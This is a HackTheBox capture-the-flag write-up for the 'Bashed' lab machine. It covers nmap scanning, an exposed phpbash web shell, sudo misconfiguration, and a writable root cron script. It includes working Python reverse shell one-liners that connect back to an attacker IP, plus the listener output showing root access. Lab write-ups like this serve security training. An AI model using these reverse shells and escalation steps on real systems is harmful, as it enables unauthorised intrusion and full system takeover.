---
description: Bashed box from HackTheBox write up.
---

# Bashed

## Nmap scan

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap --min-rate 1000 -p- 10.10.10.68
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-20 11:38 EST
Nmap scan report for 10.10.10.68
Host is up (0.052s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 17.34 seconds
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p80 10.10.10.68
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-20 11:40 EST
Nmap scan report for 10.10.10.68
Host is up (0.053s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.05 seconds
```

Only port 80 open so let's check that website.

## Port 80

Well the webpage looks like a blog and it only has one article speaking about a tool called `phpbash`. This tool provides a semi-interactive web shell to the machine and according to the author article, he developed it in the same server that is hosting the page.

The article contains an image that looks like reveals the location of the tool in the `/uploads` directory but it is not there. Since the author said that he developed it, I tried to check something like a `/dev` directory and it worked! This directory not only has directory listing enabled, it contains the `phpbash` utility.

### Getting a reverse shell

After some try and error, I was able to get a python reverse shell using:

```bash
python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("10.10.14.40",8000));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```

Now we can just upgrade it to a full `tty`. The user flag is under `/home/arrexel/user.txt`.

## Privilege escalation

### As www-data

Once in the machine, I tried some basic enumeration commands and this is interesting:

```bash
www-data@bashed:/home/arrexel$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

The user `www-data` can execute commands as `scriptmanager` without password so we can just execute bash as that user to impersonate it:

```bash
www-data@bashed:/home/arrexel$ sudo -u scriptmanager bash -p
scriptmanager@bashed:/home/arrexel$
```

### As scriptmanager

I decided to look for all the files owned by this user with:

```bash
scriptmanager@bashed:/scripts$ find / -user scriptmanager 2> /dev/null 
/scripts
/scripts/test.py
/home/scriptmanager
/home/scriptmanager/.profile
/home/scriptmanager/.bashrc
/home/scriptmanager/.nano
/home/scriptmanager/.bash_history
/home/scriptmanager/.bash_logout
/proc/10983
/proc/10983/task
...REDACTED...
```

The `scripts` folder looks promising, it contains a Python script and also a file owned by `root` called `test.txt`. Checking the script looks like that `txt` file is the output of the code. 

Looks like there is a `cron` job executing the script as `root` because the file creation date is updated every minute or so. Since we can change the script we could get a reverse shell as the `root` user changing the script content to this:

```bash
a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("10.10.14.40",8080));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")
```

Now it is time to spin up a listener and wait...

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.10.14.40] from (UNKNOWN) [10.10.10.68] 42738
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

And we got a `root` shell! The flag is under `/root/root.txt`
